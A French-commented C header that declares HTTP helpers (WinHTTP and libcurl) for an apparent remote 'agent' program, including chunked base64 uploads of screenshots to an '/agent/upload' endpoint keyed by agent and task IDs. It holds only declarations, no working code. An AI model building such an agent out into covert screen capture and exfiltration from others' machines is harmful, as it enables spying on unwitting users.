/*
 * ============================================================
 *  http.h - Interface de la couche HTTP
 *
 *  Role : Abstraire les communications reseau derriere deux
 *         fonctions uniques http_post_json() / http_get().
 *
 *  Windows : WinHTTP natif (winhttp.dll - inclus depuis XP)
 *            > binaire autonome, aucune DLL externe requise
 *  Linux   : libcurl
 *
 *  Depend de : platform.h
 * ============================================================
 */
#ifndef HTTP_H
#define HTTP_H

#include "platform.h"

/* ============================================================
 *  STRUCTURE
 * ============================================================ */

/**
 * Buffer dynamique pour la reponse HTTP.
 * data : chaine allouee avec malloc(), toujours terminee par '\0'.
 *        L'APPELANT est responsable de free(resp.data).
 * size : nombre d'octets utiles (hors '\0' final).
 */
typedef struct {
    char  *data;
    size_t size;
} HttpBuffer;


/* ============================================================
 *  INTERFACE PUBLIQUE (Windows et Linux)
 * ============================================================ */

/**
 * Envoie un POST avec un corps JSON et recupere la reponse.
 * Retourne le code HTTP (200, 404?) ou -1 si erreur reseau.
 * resp->data doit etre libere par l'appelant.
 */
long http_post_json(const char *url, const char *json_body, HttpBuffer *resp);

/**
 * Envoie un GET et recupere la reponse.
 * Retourne le code HTTP ou -1 si erreur reseau.
 * resp->data doit etre libere par l'appelant.
 */
long http_get(const char *url, HttpBuffer *resp);

/**
 * POST un chunk de fichier (base64) vers /agent/upload.
 * Utilise par mod_screenshot pour le transfert chunke.
 * Retourne le code HTTP ou -1 si erreur reseau.
 */
long http_post_file_chunk(const char *url,
                          const char *agent_id,
                          const char *task_id,
                          const char *filename,
                          int chunk_idx,
                          int total_chunks,
                          const char *b64_data,
                          HttpBuffer *resp);


/* ============================================================
 *  FONCTIONS INTERNES WINDOWS (declarees ici pour http.c)
 * ============================================================ */

#ifdef PLATFORM_WINDOWS
/**
 * Convertit char* > wchar_t* (WinHTTP exige UTF-16).
 */
void str_to_wide(const char *src, wchar_t *dst, int dst_sz);

/**
 * Decompose "http://host:port/path" en composants separes.
 * WinHTTP a besoin du host, port et path de maniere independante.
 */
void parse_url(const char *url,
               char *host, size_t host_sz,
               INTERNET_PORT *port,
               char *path, size_t path_sz);

/**
 * Lit le corps complet d'une reponse WinHTTP (alloue dynamiquement).
 */
void winhttp_read_body(HINTERNET hReq, HttpBuffer *resp);

/**
 * Lit le code HTTP et le corps d'une reponse WinHTTP.
 * Retourne -1 si l'interrogation du header echoue.
 */
long winhttp_status_and_read(HINTERNET hReq, HttpBuffer *resp);
#endif /* PLATFORM_WINDOWS */


/* ============================================================
 *  FONCTION INTERNE LINUX
 * ============================================================ */

#ifdef PLATFORM_LINUX
/**
 * Callback libcurl : recoit les chunks de reponse et les accumule
 * dans un HttpBuffer en reallouant dynamiquement.
 */
size_t http_write_cb(void *data, size_t size, size_t nmemb, void *userp);
#endif /* PLATFORM_LINUX */

#endif /* HTTP_H */
